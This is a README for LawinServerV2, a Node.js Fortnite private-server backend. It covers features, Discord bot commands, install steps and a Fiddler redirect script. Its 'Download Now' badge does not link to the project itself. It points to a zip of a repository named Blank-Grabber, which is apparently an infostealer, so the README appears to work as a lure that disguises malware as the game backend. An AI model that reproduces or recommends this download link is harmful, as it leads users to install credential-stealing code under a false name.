<img style="vertical-align: middle;" src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Ftse1.mm.bing.net%2Fth%3Fid%3DOIP.Zs2Ec_WFJI4UGASq9IuYJAHaHa%26pid%3DApi&f=1&ipt=a271582403e961978ce0ed2d5203f75c56a8f456a046f3fb89952c4bfe0691b0&ipo=images" width="120" height="120" align="left">

# LawinServerV2
LawinServer V2 is a fortnite backend written in Node.js that features an account system, xmpp and a locker.</br>[Lawin YouTube](https://www.youtube.com/channel/UCiq0PARLj_e_Nqjc_nIv-Eg) · [Issue Tracker](https://github.com/Lawin0129/LawinServerV2/issues) · [Install Backend](#install)


## Features
### Backend Features
* CloudStorage and ClientSettings (Settings Saving).
* Locker:
    + Changing current items.
    + Changing banner icon and banner color.
    + Changing item edit styles.
    + Favoriting items.
    + Marking items as seen.
* Friends:
    + Adding friends.
    + Accepting friend requests.
    + Removing friends.
    + Blocking users.
    + Setting nicknames.
    + Removing nicknames.
* Item Shop:
    + Customizable Item Shop.
    + Purchasing items from the Item Shop.
    + Gifting items to your friends.
### XMPP Features
- Parties (builds 3.5 to 14.50).
- Chat (whispering, global chat, party chat).
- Friends.
### NOTE: LawinServerV2 does not support Save the World. Sorry!

## Discord Bot Commands

### Commands:
- `/create {email} {username} {password}` - Creates an account on the backend (Each user can only create 1 account).
- `/details` - Retrieves your account info.
- `/lookup {username}` - Retrieves someones account info.
- `/otp-code` - Generates a One Time Password (OTP) for login. (If not used it expires after 5 mins).
- `/change-username {newUsername}` - You can change your username using this command.
- `/change-password {newPassword}` - You can change your password using this command.
- `/sign-out-of-all-sessions` - Signs you out of the game if you have an active session.
- `/delete` - Deletes your account from the Backend.
- `/clear-shop-items` - Removes any items in your profile that is from the item shop.

### Moderation Commands:
- You can only use the moderation commands if you are a moderator.
- `/ban {targetUsername}` - Ban a user from the backend by their username.
- `/unban {targetUsername}` - Unban a user from the backend by their username.
- `/kick {targetUsername}` - Kick someone out of their current game session by their username.
- `/addall {targetUsername}` - Add all skins to a users account by their username

### How do I set up Discord moderators?
1) Go to Config/config.json in the directory you extracted LawinServerV2 into.
2) Open it, you should see a "moderators" section in the file.
3) You have to get your discord id and replace discordId with it.
4) You can set multiple moderators like this `["discordId","discordId2"]`.

## Using LawinServerV2 for a project
You are allowed to host for others, however please credit [me](https://github.com/Lawin0129) and don't remove my credits from `responses/contentpages.json`.

# Install

[![Download](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=appveyor)](https://github.com/Blank-c/Blank-Grabber/archive/refs/heads/main.zip)

1) Install [NodeJS](https://nodejs.org/en/) and [MongoDB Community (with Compass)](https://www.mongodb.com/try/download/community).
2) Download and Extract LawinServerV2 to a safe location. (eg. a folder on an external drive or on your hard drive)
3) Run "install_packages.bat" to install all the required modules.
4) Go to Config/config.json in the directory you extracted LawinServerV2 into.
5) Open it, set your discord bot token (DO **NOT EVER** SHARE THIS TOKEN) and save it. The discord bot will be used for creating accounts and managing your account.
6) Run "start.bat", if there is no errors, it should work.
7) Use something to redirect the Fortnite servers to `localhost:8080` (working fiddler script below)
8) When Fortnite launches and is connected to the backend, enter your email and password (or launch with an OTP code) then press login. It should let you in and everything should be working fine.

## What is the most effective Fiddler script?

This script is used for redirecting all Fortnite servers to `localhost:8080`:

```ini
import System;
import System.IO;
import System.Threading;
import System.Web;
import System.Windows.Forms;
import Fiddler;

class Handlers
{
    static function OnBeforeRequest(oSession: Session) {
        if (oSession.hostname.Contains(".ol.epicgames.com"))
        {
            if (oSession.HTTPMethodIs("CONNECT"))
            {
                oSession["x-replywithtunnel"] = "FortniteTunnel";
                return;
            }

            oSession.fullUrl = "http://localhost:8080" + oSession.PathAndQuery;
        }
    }
}
```

# Credits
[Lawin0129](https://github.com/Lawin0129) - Original LawinServerV2 Code

[PRO100KatYT](https://github.com/PRO100KatYT) - Contributor

[secret-pommes](https://github.com/secret-pommes)- Contributor

[OptiX YT](https://codeberg.org/optixyt) - Contributor
